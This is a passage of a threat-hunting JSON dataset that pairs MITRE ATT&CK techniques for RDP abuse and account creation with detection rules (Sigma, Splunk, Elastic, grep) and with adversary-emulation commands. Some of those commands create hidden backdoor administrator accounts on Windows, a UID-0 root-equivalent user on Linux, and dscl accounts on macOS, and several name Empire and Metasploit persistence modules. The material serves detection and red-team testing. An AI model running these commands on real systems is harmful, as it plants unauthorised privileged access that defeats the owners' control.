and(process_path contains \"tscon.exe\"or process_path contains \"mstsc.exe\")", "product": "Azure Sentinel", "name": "Remote Desktop Protocol Process"}, {"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (process_path contains \"LogonUI.exe\"or registry_key_path contains \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services\\\\\")", "product": "Azure Sentinel", "name": "Remote Desktop Protocol Registry"}, {"query": "title: RDP over Reverse SSH Tunnel\nid: 5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4\nstatus: experimental\ndescription: Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389\nreferences:\n    - https://twitter.com/SBousseaden/status/1096148422984384514\nauthor: Samir Bousseaden\ndate: 2019/02/16\ntags:\n    - attack.defense_evasion\n    - attack.command_and_control\n    - attack.t1076\n    - car.2013-07-002\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        Image: '*\\svchost.exe'\n        Initiated: 'true'\n        SourcePort: 3389 \n        DestinationIp:\n            - '127.*'\n            - '::1'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: RDP over Reverse SSH Tunnel\nid: 5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4\nstatus: experimental\ndescription: Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389\nreferences:\n    - https://twitter.com/SBousseaden/status/1096148422984384514\nauthor: Samir Bousseaden\ndate: 2019/02/16\ntags:\n    - attack.defense_evasion\n    - attack.command_and_control\n    - attack.t1076\n    - car.2013-07-002\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        Image: '*\\svchost.exe'\n        Initiated: 'true'\n        SourcePort: 3389 \n        DestinationIp:\n            - '127.*'\n            - '::1'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"3\" AND Image.keyword:*\\\\\\\\svchost.exe AND Initiated:\"true\" AND SourcePort:\"3389\" AND DestinationIp.keyword:(127.* OR \\\\:\\\\:1))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/RDP-over-Reverse-SSH-Tunnel <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"RDP over Reverse SSH Tunnel\",\\n    \"description\": \"Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.command_and_control\",\\n      \"attack.t1076\",\\n      \"car.2013-07-002\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"3\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\svchost.exe AND Initiated:\\\\\"true\\\\\" AND SourcePort:\\\\\"3389\\\\\" AND DestinationIp.keyword:(127.* OR \\\\\\\\:\\\\\\\\:1))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"3\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\svchost.exe AND Initiated:\\\\\"true\\\\\" AND SourcePort:\\\\\"3389\\\\\" AND DestinationIp.keyword:(127.* OR \\\\\\\\:\\\\\\\\:1))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'RDP over Reverse SSH Tunnel\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"3\" AND Image.keyword:*\\\\\\\\svchost.exe AND Initiated:\"true\" AND SourcePort:\"3389\" AND DestinationIp.keyword:(127.* \\\\:\\\\:1))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"3\" Image=\"*\\\\\\\\svchost.exe\" Initiated=\"true\" SourcePort=\"3389\" (DestinationIp=\"127.*\" OR DestinationIp=\"::1\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"3\" Image=\"*\\\\\\\\svchost.exe\" Initiated=\"true\" SourcePort=\"3389\" DestinationIp IN [\"127.*\", \"::1\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*3)(?=.*.*\\\\svchost\\\\.exe)(?=.*true)(?=.*3389)(?=.*(?:.*127\\\\..*|.*::1)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: RDP Login from localhost\nid: 51e33403-2a37-4d66-a574-1fda1782cc31\ndescription: RDP login with localhost source address may be a tunnelled login\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html\ndate: 2019/01/28\nmodified: 2019/01/29\ntags:\n    - attack.lateral_movement\n    - attack.t1076\n    - car.2013-07-002\nstatus: experimental\nauthor: Thomas Patzke\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 10\n        SourceNetworkAddress:\n            - \"::1\"\n            - \"127.0.0.1\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: RDP Login from localhost\nid: 51e33403-2a37-4d66-a574-1fda1782cc31\ndescription: RDP login with localhost source address may be a tunnelled login\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html\ndate: 2019/01/28\nmodified: 2019/01/29\ntags:\n    - attack.lateral_movement\n    - attack.t1076\n    - car.2013-07-002\nstatus: experimental\nauthor: Thomas Patzke\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 10\n        SourceNetworkAddress:\n            - \"::1\"\n            - \"127.0.0.1\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4624\" AND LogonType:\"10\" AND SourceNetworkAddress:(\"\\\\:\\\\:1\" OR \"127.0.0.1\"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/RDP-Login-from-localhost <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"RDP Login from localhost\",\\n    \"description\": \"RDP login with localhost source address may be a tunnelled login\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1076\",\\n      \"car.2013-07-002\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4624\\\\\" AND LogonType:\\\\\"10\\\\\" AND SourceNetworkAddress:(\\\\\"\\\\\\\\:\\\\\\\\:1\\\\\" OR \\\\\"127.0.0.1\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4624\\\\\" AND LogonType:\\\\\"10\\\\\" AND SourceNetworkAddress:(\\\\\"\\\\\\\\:\\\\\\\\:1\\\\\" OR \\\\\"127.0.0.1\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'RDP Login from localhost\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4624\" AND LogonType:\"10\" AND SourceNetworkAddress:(\"\\\\:\\\\:1\" \"127.0.0.1\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4624\" LogonType=\"10\" (SourceNetworkAddress=\"::1\" OR SourceNetworkAddress=\"127.0.0.1\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4624\" logon_type=\"10\" SourceNetworkAddress IN [\"::1\", \"127.0.0.1\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4624)(?=.*10)(?=.*(?:.*::1|.*127\\\\.0\\\\.0\\\\.1)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: RDP over Reverse SSH Tunnel WFP\nid: 5bed80b6-b3e8-428e-a3ae-d3c757589e41\nstatus: experimental\ndescription: Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389\nreferences:\n    - https://twitter.com/SBousseaden/status/1096148422984384514\nauthor: Samir Bousseaden\ndate: 2019/02/16\ntags:\n    - attack.defense_evasion\n    - attack.command_and_control\n    - attack.t1076\n    - car.2013-07-002\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5156\n    sourceRDP:\n        SourcePort: 3389\n        DestinationAddress:\n            - '127.*'\n            - '::1'\n    destinationRDP:\n        DestinationPort: 3389\n        SourceAddress:\n            - '127.*'\n            - '::1'\n    condition: selection and ( sourceRDP or destinationRDP )\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: RDP over Reverse SSH Tunnel WFP\nid: 5bed80b6-b3e8-428e-a3ae-d3c757589e41\nstatus: experimental\ndescription: Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389\nreferences:\n    - https://twitter.com/SBousseaden/status/1096148422984384514\nauthor: Samir Bousseaden\ndate: 2019/02/16\ntags:\n    - attack.defense_evasion\n    - attack.command_and_control\n    - attack.t1076\n    - car.2013-07-002\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5156\n    sourceRDP:\n        SourcePort: 3389\n        DestinationAddress:\n            - '127.*'\n            - '::1'\n    destinationRDP:\n        DestinationPort: 3389\n        SourceAddress:\n            - '127.*'\n            - '::1'\n    condition: selection and ( sourceRDP or destinationRDP )\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"5156\" AND ((SourcePort:\"3389\" AND DestinationAddress.keyword:(127.* OR \\\\:\\\\:1)) OR (DestinationPort:\"3389\" AND SourceAddress.keyword:(127.* OR \\\\:\\\\:1))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/RDP-over-Reverse-SSH-Tunnel-WFP <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"RDP over Reverse SSH Tunnel WFP\",\\n    \"description\": \"Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.command_and_control\",\\n      \"attack.t1076\",\\n      \"car.2013-07-002\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"5156\\\\\" AND ((SourcePort:\\\\\"3389\\\\\" AND DestinationAddress.keyword:(127.* OR \\\\\\\\:\\\\\\\\:1)) OR (DestinationPort:\\\\\"3389\\\\\" AND SourceAddress.keyword:(127.* OR \\\\\\\\:\\\\\\\\:1))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"5156\\\\\" AND ((SourcePort:\\\\\"3389\\\\\" AND DestinationAddress.keyword:(127.* OR \\\\\\\\:\\\\\\\\:1)) OR (DestinationPort:\\\\\"3389\\\\\" AND SourceAddress.keyword:(127.* OR \\\\\\\\:\\\\\\\\:1))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'RDP over Reverse SSH Tunnel WFP\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"5156\" AND ((SourcePort:\"3389\" AND DestinationAddress.keyword:(127.* \\\\:\\\\:1)) OR (DestinationPort:\"3389\" AND SourceAddress.keyword:(127.* \\\\:\\\\:1))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"5156\" ((SourcePort=\"3389\" (DestinationAddress=\"127.*\" OR DestinationAddress=\"::1\")) OR (DestinationPort=\"3389\" (SourceAddress=\"127.*\" OR SourceAddress=\"::1\"))))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"5156\" ((SourcePort=\"3389\" DestinationAddress IN [\"127.*\", \"::1\"]) OR (DestinationPort=\"3389\" SourceAddress IN [\"127.*\", \"::1\"])))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*5156)(?=.*(?:.*(?:.*(?:.*(?=.*3389)(?=.*(?:.*127\\\\..*|.*::1)))|.*(?:.*(?=.*3389)(?=.*(?:.*127\\\\..*|.*::1)))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious RDP Redirect Using TSCON\nid: f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb\nstatus: experimental\ndescription: Detects a suspicious RDP session redirect using tscon.exe\nreferences:\n    - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\n    - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\ntags:\n    - attack.lateral_movement\n    - attack.privilege_escalation\n    - attack.t1076\n    - car.2013-07-002\nauthor: Florian Roth\ndate: 2018/03/17\nmodified: 2018/12/11\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '* /dest:rdp-tcp:*'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious RDP Redirect Using TSCON\nid: f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb\nstatus: experimental\ndescription: Detects a suspicious RDP session redirect using tscon.exe\nreferences:\n    - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\n    - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\ntags:\n    - attack.lateral_movement\n    - attack.privilege_escalation\n    - attack.t1076\n    - car.2013-07-002\nauthor: Florian Roth\ndate: 2018/03/17\nmodified: 2018/12/11\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '* /dest:rdp-tcp:*'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:*\\\\ \\\\/dest\\\\:rdp\\\\-tcp\\\\:*", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-RDP-Redirect-Using-TSCON <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious RDP Redirect Using TSCON\",\\n    \"description\": \"Detects a suspicious RDP session redirect using tscon.exe\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1076\",\\n      \"car.2013-07-002\"\\n    ],\\n    \"query\": \"CommandLine.keyword:*\\\\\\\\ \\\\\\\\/dest\\\\\\\\:rdp\\\\\\\\-tcp\\\\\\\\:*\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:*\\\\\\\\ \\\\\\\\/dest\\\\\\\\:rdp\\\\\\\\-tcp\\\\\\\\:*\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious RDP Redirect Using TSCON\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:* \\\\/dest\\\\:rdp\\\\-tcp\\\\:*", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "CommandLine=\"* /dest:rdp-tcp:*\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"* /dest:rdp-tcp:*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.* /dest:rdp-tcp:.*'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Add backdoor user account:\nnet user support_388945a0 somepasswordhere /add /y\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Add backdoor user account:\nshell net user support_388945a0 somepasswordhere /add /y\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/manage/add_user_domain", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Enable backdoor user account:\nnet user support_388945a0 /active:yes\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Enable backdoor user account:\nshell net user support_388945a0 /active:yes\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "name": "Cobalt Strike"}, {"source": "atomics/T1136/T1136.yaml", "command": "useradd -M -N -r -s /bin/bash -c evil_account evil_user\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "useradd -M -N -r -s /bin/bash -c evil_account evil_user\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "dscl . -create /Users/evil_user\ndscl . -create /Users/evil_user UserShell /bin/bash\ndscl . -create /Users/evil_user RealName \"#{realname}\"\ndscl . -create /Users/evil_user UniqueID \"1010\"\ndscl . -create /Users/evil_user PrimaryGroupID 80\ndscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "dscl . -create /Users/evil_user\ndscl . -create /Users/evil_user UserShell /bin/bash\ndscl . -create /Users/evil_user RealName \"Evil Account\"\ndscl . -create /Users/evil_user UniqueID \"1010\"\ndscl . -create /Users/evil_user PrimaryGroupID 80\ndscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "net user /add \"T1136_CMD\" \"#{password}\"\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "net user /add \"T1136_CMD\" \"T1136_CMD!\"\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "New-LocalUser -Name \"T1136_PowerShell\" -NoPassword\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter\necho \"#{password}\" | passwd --stdin butter\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter\necho \"BetterWithButter\" | passwd --stdin butter\n", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe user /add", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe localgroup administrators * /add", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe user * \\password \\domain", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe dsadd user", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/add_netuser", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/add_netuser", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_useradd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_useradd", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "useradd -M -N -r -s /bin/bash -c \"#{comment}\" #{username}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}", "name": null}], "command_list": ["Add backdoor user account:\nnet user support_388945a0 somepasswordhere /add /y\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "Add backdoor user account:\nshell net user support_388945a0 somepasswordhere /add /y\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "post/windows/manage/add_user_domain", "Enable backdoor user account:\nnet user support_388945a0 /active:yes\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "Enable backdoor user account:\nshell net user support_388945a0 /active:yes\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "useradd -M -N -r -s /bin/bash -c evil_account evil_user\n", "useradd -M -N -r -s /bin/bash -c evil_account evil_user\n", "dscl . -create /Users/evil_user\ndscl . -create /Users/evil_user UserShell /bin/bash\ndscl . -create /Users/evil_user RealName \"#{realname}\"\ndscl . -create /Users/evil_user UniqueID \"1010\"\ndscl . -create /Users/evil_user PrimaryGroupID 80\ndscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user\n", "dscl . -create /Users/evil_user\ndscl . -create /Users/evil_user UserShell /bin/bash\ndscl . -create /Users/evil_user RealName \"Evil Account\"\ndscl . -create /Users/evil_user UniqueID \"1010\"\ndscl . -create /Users/evil_user PrimaryGroupID 80\ndscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user\n", "net user /add \"T1136_CMD\" \"#{password}\"\n", "net user /add \"T1136_CMD\" \"T1136_CMD!\"\n", "New-LocalUser -Name \"T1136_PowerShell\" -NoPassword\n", "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter\necho \"#{password}\" | passwd --stdin butter\n", "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter\necho \"BetterWithButter\" | passwd --stdin butter\n", "Net.exe user /add", "Net.exe localgroup administrators * /add", "Net.exe user * \\password \\domain", "Net.exe dsadd user", "powershell/persistence/misc/add_netuser", "powershell/persistence/misc/add_netuser", "powershell/privesc/powerup/service_useradd", "powershell/privesc/powerup/service_useradd", "useradd -M -N -r -s /bin/bash -c \"#{comment}\" #{username}", "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}"], "technique_id": "T1136", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1136", "Built-in Windows Command": "Add backdoor user account:\nnet user support_388945a0 somepasswordhere /add /y\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "Cobalt Strike": "Add backdoor user account:\nshell net user support_388945a0 somepasswordhere /add /y\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "Description": "Create a backdoor user account that often appears on windows systems and add that user to the local administrators group and the remote desktop users group. This combined with the sticky keys persistence grants an inocuous system level persistence mechanism.", "Metasploit": "post/windows/manage/add_user_domain"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1136", "Built-in Windows Command": "Enable backdoor user account:\nnet user support_388945a0 /active:yes\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "Cobalt Strike": "Enable backdoor user account:\nshell net user support_388945a0 /active:yes\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "Description": "If the support_388945a0 account already exists on the system, but is disabled, you can enable it and then add it to the necessary groups.", "Metasploit": ""}}, {"Atomic Red Team Test - Create Account": {"display_name": "Create Account", "atomic_tests": [{"description": "Create a user via useradd\n", "supported_platforms": ["linux"], "name": "Create a user account on a Linux system", "input_arguments": {"username": {"default": "evil_user", "type": "String", "description": "Username of the user to create"}, "comment": {"default": "Evil Account", "type": "String", "description": "Comment to record when creating the user"}}, "executor": {"elevation_required": true, "command": "useradd -M -N -r -s /bin/bash -c evil_account #{username}\n", "name": "bash", "cleanup_command": "userdel #{username}\n"}}, {"description": "Creates a user on a MacOS system with dscl\n", "supported_platforms": ["macos"], "name": "Create a user account on a MacOS system", "input_arguments": {"username": {"default": "evil_user", "type": "String", "description": "Username of the user to create"}, "realname": {"default": "Evil Account", "type": "String", "description": "'realname' to record when creating the user"}}, "executor": {"elevation_required": true, "command": "dscl . -create /Users/#{username}\ndscl . -create /Users/#{username} UserShell /bin/bash\ndscl . -create /Users/#{username} RealName \"#{realname}\"\ndscl . -create /Users/#{username} UniqueID \"1010\"\ndscl . -create /Users/#{username} PrimaryGroupID 80\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\n", "name": "bash", "cleanup_command": "dscl . -delete /Users/#{username}\n"}}, {"description": "Creates a new user in a command prompt\n", "supported_platforms": ["windows"], "name": "Create a new user in a command prompt", "input_arguments": {"username": {"default": "T1136_CMD", "type": "String", "description": "Username of the user to create"}, "password": {"default": "T1136_CMD!", "type": "String", "description": "Password of the user to create"}}, "executor": {"elevation_required": true, "command": "net user /add \"#{username}\" \"#{password}\"\n", "name": "command_prompt", "cleanup_command": "net user /del \"#{username}\"\n"}}, {"description": "Creates a new user in PowerShell\n", "supported_platforms": ["windows"], "name": "Create a new user in PowerShell", "input_arguments": {"username": {"default": "T1136_PowerShell", "type": "String", "description": 